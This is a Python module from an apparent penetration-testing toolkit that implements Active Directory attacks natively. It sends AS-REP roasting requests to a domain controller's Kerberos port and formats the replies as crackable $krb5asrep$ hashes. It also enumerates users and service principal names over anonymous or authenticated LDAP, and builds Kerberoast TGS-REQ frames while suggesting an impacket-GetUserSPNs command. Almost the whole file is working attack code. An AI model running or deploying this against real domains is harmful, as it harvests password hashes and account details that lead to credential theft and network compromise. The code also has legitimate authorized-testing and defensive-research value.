"""Native Kerberos/LDAP attacks with no impacket/ldap3 dependency.

Implements a pure-Python AS-REP Roast (hand-built AS-REQ over TCP 88),
native LDAP bind/search over TCP 389, and a Kerberoast skeleton that
enumerates SPNs via LDAP. Transports are injectable so every stage is
fully testable without live KDC/LDAP servers.

AS-REP Roast differential judgment (mirrors GetUserSPNs/GetNPUsers):
* AS-REP (msg-type 11) received  -> user does NOT require preauth, roastable
* KRB-ERROR error-code 0x12      -> preauth required, user not roastable
* KRB-ERROR error-code 0x6       -> principal unknown (user does not exist)
"""
import random
import socket
from typing import Callable, Dict, List, Optional, Sequence, Tuple

from tools.log_utils import get_logger

logger = get_logger("domain_attacks")

KERBEROS_PORT = 88
LDAP_PORT = 389
DEFAULT_ETYPES = [18, 17, 23]  # aes256-cts, aes128-cts, rc4-hmac
AS_REQ_MSG_TYPE = 10
AS_REP_MSG_TYPE = 11
TGS_REQ_MSG_TYPE = 12
KRB_ERROR_MSG_TYPE = 30
KDC_ERR_PREAUTH_REQUIRED = 0x12
KDC_ERR_C_PRINCIPAL_UNKNOWN = 0x6
AS_REP_APPLICATION_TAG = 0x6B  # [APPLICATION 11]
KRB_ERROR_APPLICATION_TAG = 0x7E  # [APPLICATION 30]


def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(value)) + value


def _der_int(n: int) -> bytes:
    if n == 0:
        raw = b"\x00"
    else:
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return _der_tlv(0x02, raw)


def _der_seq(*parts: bytes) -> bytes:
    return _der_tlv(0x30, b"".join(parts))


def _der_gs(s: str) -> bytes:
    return _der_tlv(0x1B, s.encode("utf-8"))


def _der_time(s: str) -> bytes:
    return _der_tlv(0x18, s.encode("ascii"))


def _der_bits(data: bytes) -> bytes:
    return _der_tlv(0x03, b"\x00" + data)


def _ctx(n: int, tlv: bytes) -> bytes:
    return _der_tlv(0xA0 | n, tlv)


def _parse_tlv(data: bytes, offset: int = 0) -> Tuple[int, bytes, int]:
    tag = data[offset]
    offset += 1
    b = data[offset]
    offset += 1
    if b & 0x80:
        n = b & 0x7F
        length = int.from_bytes(data[offset:offset + n], "big")
        offset += n
    else:
        length = b
    return tag, data[offset:offset + length], offset + length


def _seq_fields(content: bytes) -> List[Tuple[int, bytes]]:
    fields: List[Tuple[int, bytes]] = []
    off = 0
    while off < len(content):
        tag, value, off = _parse_tlv(content, off)
        fields.append((tag, value))
    return fields


def _principal(name_type: int, names: Sequence[str]) -> bytes:
    inner = _ctx(0, _der_int(name_type))
    inner += _ctx(1, _der_seq(*[_der_gs(n) for n in names]))
    return _der_seq(inner)


def _kdc_req_body(realm: str, cname: Optional[Sequence[str]] = None,
                  sname: Optional[Sequence[str]] = None,
                  etypes: Optional[Sequence[int]] = None,
                  nonce: Optional[int] = None) -> bytes:
    etypes = etypes or DEFAULT_ETYPES
    if nonce is None:
        nonce = random.getrandbits(31)
    fields = [_ctx(0, _der_bits(b"\x50\x80\x00\x00"))]
    if cname:
        fields.append(_ctx(1, _principal(1, cname)))
    fields.append(_ctx(2, _der_gs(realm)))
    if sname:
        fields.append(_ctx(3, _principal(2, sname)))
    fields.append(_ctx(5, _der_time("20370913024805Z")))
    fields.append(_ctx(7, _der_int(nonce)))
    fields.append(_ctx(8, _der_seq(*[_der_int(e) for e in etypes])))
    return _der_seq(*fields)


def build_as_req(realm: str, username: str, etypes: Optional[Sequence[int]] = None,
                 nonce: Optional[int] = None) -> bytes:
    """Build a bare AS-REQ for AS-REP roasting (no PA-DATA)."""
    body_seq = _kdc_req_body(realm, cname=[username], sname=["krbtgt", realm],
                             etypes=etypes, nonce=nonce)
    inner = _ctx(1, _der_int(5)) + _ctx(2, _der_int(AS_REQ_MSG_TYPE)) + _ctx(4, body_seq)
    return _der_tlv(0x6A, inner)


def build_tgs_req(realm: str, spn: str, etypes: Optional[Sequence[int]] = None,
                  nonce: Optional[int] = None) -> bytes:
    """Build a structural TGS-REQ skeleton for a service principal.

    The real KDC requires a PA-TGS-REQ authenticator encrypted with a TGT
    session key (needs credential crypto); this returns the request frame
    with the target SPN populated so downstream crypto can be layered in.
    """
    service, _, host = spn.partition("/")
    sname_parts = [service] if not host else [service, host]
    body_seq = _kdc_req_body(realm, sname=sname_parts, etypes=etypes, nonce=nonce)
    inner = _ctx(1, _der_int(5)) + _ctx(2, _der_int(TGS_REQ_MSG_TYPE)) + _ctx(4, body_seq)
    return _der_tlv(0x6C, inner)


def _error_code(seq_content: bytes) -> Optional[int]:
    for tag, val in _seq_fields(seq_content):
        if tag == 0xA7:  # error-code [7]
            _, iv, _ = _parse_tlv(val, 0)
            return int.from_bytes(iv, "big")
    return None


def parse_kdc_response(data: bytes) -> Dict:
    """Parse a KDC reply (AS-REP or KRB-ERROR) into a verdict dict."""
    if not data:
        return {"msg_type": None, "error_code": None}
    tag, value, _ = _parse_tlv(data, 0)
    if tag == KRB_ERROR_APPLICATION_TAG:
        return {"msg_type": KRB_ERROR_MSG_TYPE, "error_code": _error_code(value)}
    fields = _seq_fields(value)
    msg_type = None
    enc = None
    for ftag, fval in fields:
        if ftag == 0xA2:  # msg-type [2]
            _, iv, _ = _parse_tlv(fval, 0)
            msg_type = int.from_bytes(iv, "big")
        elif ftag == 0xBA:  # enc-part [26]
            enc = fval
    if msg_type != AS_REP_MSG_TYPE or enc is None:
        return {"msg_type": msg_type, "error_code": _error_code(value)}
    _, enc_seq, _ = _parse_tlv(enc, 0)
    etype = None
    cipher = b""
    for etag, eval_ in _seq_fields(enc_seq):
        if etag == 0xA0:  # etype [0]
            _, iv, _ = _parse_tlv(eval_, 0)
            etype = int.from_bytes(iv, "big")
        elif etag == 0xA2:  # cipher [2]
            _, cv, _ = _parse_tlv(eval_, 0)
            cipher = cv
    return {"msg_type": AS_REP_MSG_TYPE, "etype": etype, "cipher": cipher}


def default_krb_sender(host: str, port: int, payload: bytes,
                       timeout: float = 3.0) -> bytes:
    """Send a Kerberos message over TCP with 4-byte length framing."""
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.settimeout(timeout)
        s.sendall(len(payload).to_bytes(4, "big") + payload)
        head = b""
        while len(head) < 4:
            chunk = s.recv(4 - len(head))
            if not chunk:
                return b""
            head += chunk
        total = int.from_bytes(head, "big")
        data = b""
        while len(data) < total:
            chunk = s.recv(total - len(data))
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def asrep_roast(dc_ip: str, realm: str, usernames: Sequence[str],
                etypes: Optional[Sequence[int]] = None,
                timeout: float = 3.0,
                sender: Optional[Callable] = None) -> Dict:
    """AS-REP roast a user list via a bare AS-REQ against TCP 88."""
    sender = sender or default_krb_sender
    result: Dict = {"success": False, "asrep_users": [], "errors": []}
    for username in usernames:
        try:
            req = build_as_req(realm, username, etypes)
            resp = sender(dc_ip, KERBEROS_PORT, req, timeout)
            if not resp:
                result["errors"].append({"username": username, "error": "no response"})
                continue
            verdict = parse_kdc_response(resp)
            if verdict.get("msg_type") == AS_REP_MSG_TYPE:
                hash_line = "$krb5asrep$%d$%s@%s:%s" % (
                    verdict["etype"], username, realm.upper(), verdict["cipher"].hex())
                result["asrep_users"].append({
                    "username": username,
                    "etype": verdict["etype"],
                    "hash": hash_line,
                })
            else:
                result["errors"].append({
                    "username": username,
                    "error_code": verdict.get("error_code"),
                })
        except Exception as exc:
            result["errors"].append({"username": username, "error": str(exc)})
    result["success"] = bool(result["asrep_users"])
    return result


class _BerStream:
    """Reads self-delimiting BER messages off a socket-like object."""

    def __init__(self, conn):
        self.conn = conn
        self.buf = b""

    def _read(self, n: int) -> bytes:
        while len(self.buf) < n:
            chunk = self.conn.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        data, self.buf = self.buf[:n], self.buf[n:]
        return data

    def read_message(self) -> bytes:
        tag = self._read(1)
        if not tag:
            return b""
        lb = self._read(1)
        if not lb:
            return b""
        lb = lb[0]
        if lb & 0x80:
            n = lb & 0x7F
            lbx = self._read(n)
            length = int.from_bytes(lbx, "big")
        else:
            lbx = b""
            length = lb
        body = self._read(length)
        header = bytes([tag[0], lb]) + lbx
        return header + body


class NativeLdapClient:
    """Minimal native LDAP client (bind + search) over BER on TCP 389.

    ``conn`` is injectable for tests: any object exposing ``recv(n)``,
    ``sendall(data)`` and ``close()``. When omitted a real socket is used.
    """

    def __init__(self, host: str, port: int = LDAP_PORT, timeout: float = 3.0,
                 conn: Optional[object] = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._conn = conn
        self._stream: Optional[_BerStream] = None
        self._msgid = 0

    def _open(self) -> None:
        if self._conn is None:
            self._conn = socket.create_connection((self.host, self.port), timeout=self.timeout)
            self._conn.settimeout(self.timeout)
        if self._stream is None:
            self._stream = _BerStream(self._conn)

    def close(self) -> None:
        if self._conn is not None:
            try:
                self._conn.close()
            except Exception:
                pass
            self._conn = None
            self._stream = None

    def _exchange(self, op: bytes) -> bytes:
        self._open()
        msg = _der_seq(_der_int(self._msgid) + op)
        self._conn.sendall(msg)
        resp = self._stream.read_message()
        if not resp:
            return b""
        tag, value, _ = _parse_tlv(resp, 0)
        return value

    def bind(self, name: bytes = b"", password: bytes = b"") -> Dict:
        self._msgid += 1
        bind_req = _der_tlv(0x60, _der_int(3) + _der_tlv(0x04, name) + _der_tlv(0x80, password))
        value = self._exchange(bind_req)
        result_code = -1
        for ftag, fval in _seq_fields(value):
            if ftag == 0x61:  # BindResponse [APPLICATION 1]
                for rt, rv in _seq_fields(fval):
                    if rt == 0x0A:  # resultCode ENUMERATED
                        result_code = rv[0]
        return {"success": result_code == 0, "result_code": result_code}

    def search(self, base_dn: str, scope: int = 2,
               filter_tlv: Optional[bytes] = None,
               attributes: Optional[Sequence[str]] = None) -> Dict:
        self._msgid += 1
        attributes = list(attributes or [])
        inner = (
            _der_tlv(0x04, base_dn.encode("utf-8"))
            + _der_tlv(0x0A, bytes([scope]))
            + _der_tlv(0x0A, b"\x00")
            + _der_int(0)
            + _der_int(0)
            + _der_tlv(0x01, b"\x00")
            + (filter_tlv or _ldap_filter_present("objectClass"))
            + _der_seq(*[_der_tlv(0x04, a.encode("utf-8")) for a in attributes])
        )
        search_req = _der_tlv(0x63, inner)
        value = self._exchange(search_req)
        entries: List[Dict] = []
        result_code = -1
        while True:
            for ftag, fval in _seq_fields(value):
                if ftag == 0x64:  # SearchResultEntry [APPLICATION 4]
                    entries.append(_parse_ldap_entry(fval))
                elif ftag == 0x65:  # SearchResultDone [APPLICATION 5]
                    for rt, rv in _seq_fields(fval):
                        if rt == 0x0A:
                            result_code = rv[0]
                    return {"entries": entries, "result_code": result_code,
                            "success": result_code == 0}
            resp = self._stream.read_message()
            if not resp:
                return {"entries": entries, "result_code": result_code,
                        "success": result_code == 0}
            _, value, _ = _parse_tlv(resp, 0)


def _parse_ldap_entry(content: bytes) -> Dict:
    dn = ""
    attrs: Dict[str, List[str]] = {}
    for tag, val in _seq_fields(content):
        if tag == 0x04:
            dn = val.decode("utf-8", errors="replace")
        elif tag == 0x30:  # attributes SEQUENCE OF PartialAttribute
            for atag, aval in _seq_fields(val):
                if atag == 0x30:
                    pa = _seq_fields(aval)
                    if pa and pa[0][0] == 0x04:
                        attr_name = pa[0][1].decode("utf-8", errors="replace")
                        values: List[str] = []
                        for pt, pv in pa[1:]:
                            if pt == 0x31:  # SET OF OCTET STRING
                                for st, sv in _seq_fields(pv):
                                    if st == 0x04:
                                        values.append(sv.decode("utf-8", errors="replace"))
                        attrs[attr_name] = values
    return {"dn": dn, "attributes": attrs}


def _ldap_filter_eq(attr: str, value: str) -> bytes:
    ava = _der_tlv(0x04, attr.encode("utf-8")) + _der_tlv(0x04, value.encode("utf-8"))
    return _der_tlv(0xA3, ava)


def _ldap_filter_and(filters: Sequence[bytes]) -> bytes:
    return _der_tlv(0xA0, b"".join(filters))


def _ldap_filter_present(attr: str) -> bytes:
    return _der_tlv(0x87, attr.encode("utf-8"))


def _user_filter() -> bytes:
    return _ldap_filter_and([_ldap_filter_eq("objectClass", "user"),
                             _ldap_filter_eq("objectClass", "person")])


def _base_dn(domain: str) -> str:
    return ",".join("dc=%s" % part for part in domain.split(".") if part)


def ldap_anonymous_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
                        timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
    """Native anonymous LDAP user enumeration with no ldap3 dependency."""
    result: Dict = {"success": False, "bound": False, "entries": [], "error": None}
    client = NativeLdapClient(dc_ip, timeout=timeout, conn=conn)
    try:
        bind = client.bind()
        result["bound"] = bind["success"]
        if not bind["success"]:
            result["error"] = "anonymous bind failed: code %d" % bind["result_code"]
            return result
        base_dn = base_dn or _base_dn(domain)
        result["base_dn"] = base_dn
        out = client.search(base_dn, scope=2, filter_tlv=_user_filter(),
                            attributes=["sAMAccountName", "userAccountControl",
                                        "description", "memberOf"])
        if not out["success"]:
            result["error"] = "search failed: code %d" % out["result_code"]
            return result
        result["entries"] = out["entries"]
        result["success"] = True
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        client.close()
    return result


def spn_enum(dc_ip: str, domain: str, base_dn: Optional[str] = None,
             username: Optional[str] = None, password: Optional[str] = None,
             timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
    """Enumerate accounts with servicePrincipalName via native LDAP."""
    result: Dict = {"success": False, "spns": [], "error": None}
    client = NativeLdapClient(dc_ip, timeout=timeout, conn=conn)
    try:
        if username and password:
            bind = client.bind(("%s@%s" % (username, domain)).encode("utf-8"),
                               password.encode("utf-8"))
        else:
            bind = client.bind()
        if not bind["success"]:
            result["error"] = "bind failed: code %d" % bind["result_code"]
            return result
        base_dn = base_dn or _base_dn(domain)
        out = client.search(base_dn, scope=2,
                            filter_tlv=_ldap_filter_present("servicePrincipalName"),
                            attributes=["sAMAccountName", "servicePrincipalName"])
        if not out["success"]:
            result["error"] = "search failed: code %d" % out["result_code"]
            return result
        seen = set()
        for entry in out["entries"]:
            sam = (entry["attributes"].get("sAMAccountName") or [""])[0]
            for spn in entry["attributes"].get("servicePrincipalName", []):
                if spn not in seen:
                    seen.add(spn)
                    result["spns"].append({"sam": sam, "spn": spn})
        result["success"] = True
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        client.close()
    return result


def kerberoast_skeleton(dc_ip: str, domain: str, base_dn: Optional[str] = None,
                        username: Optional[str] = None, password: Optional[str] = None,
                        timeout: float = 3.0, conn: Optional[object] = None) -> Dict:
    """Kerberoast skeleton: native SPN enumeration + TGS-REQ frame builder."""
    result: Dict = {"success": False, "skeleton": True, "spns": [], "users": [],
                    "requests": [], "commands": [], "error": None}
    enum = spn_enum(dc_ip, domain, base_dn, username, password, timeout, conn)
    if not enum["success"]:
        result["error"] = enum["error"]
        result["commands"] = [
            "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (
                dc_ip, domain, username or "USER", password or "PASS"),
        ]
        return result
    realm = domain.upper()
    seen_users = set()
    for item in enum["spns"]:
        result["spns"].append(item["spn"])
        if item["sam"]:
            seen_users.add(item["sam"])
        try:
            req = build_tgs_req(realm, item["spn"])
            result["requests"].append({"spn": item["spn"], "tgs_req_hex": req.hex()})
        except Exception as exc:
            result["requests"].append({"spn": item["spn"], "error": str(exc)})
    result["users"] = sorted(seen_users)
    result["note"] = ("Native SPN enumeration done; TGS extraction requires TGT "
                      "session-key crypto - use impacket for the full roast")
    result["commands"] = [
        "impacket-GetUserSPNs -request -dc-ip %s %s/%s:%s" % (
            dc_ip, domain, username or "USER", password or "PASS"),
    ]
    result["success"] = True
    return result


def run(target: str, dc_ip: Optional[str] = None, domain: Optional[str] = None,
         username: Optional[str] = None, password: Optional[str] = None,
         userlist: Optional[Sequence[str]] = None, timeout: float = 3.0,
         conn: Optional[object] = None,
         sender: Optional[Callable] = None) -> Dict:
    """Drop-in entry for the domain command (mirrors domain_hunt.run)."""
    if not domain and target:
        domain = target
    if not dc_ip and target:
        try:
            dc_ip = socket.gethostbyname(target)
        except Exception:
            pass
    result: Dict = {"domain": domain, "dc_ip": dc_ip, "success": True}
    if dc_ip and domain:
        if userlist:
            result["asrep_roast"] = asrep_roast(dc_ip, domain, userlist,
                                                timeout=timeout, sender=sender)
        result["ldap"] = ldap_anonymous_enum(dc_ip, domain, timeout=timeout, conn=conn)
        result["kerberoast"] = kerberoast_skeleton(dc_ip, domain, username=username,
                                                   password=password, timeout=timeout,
                                                   conn=conn)
    return result
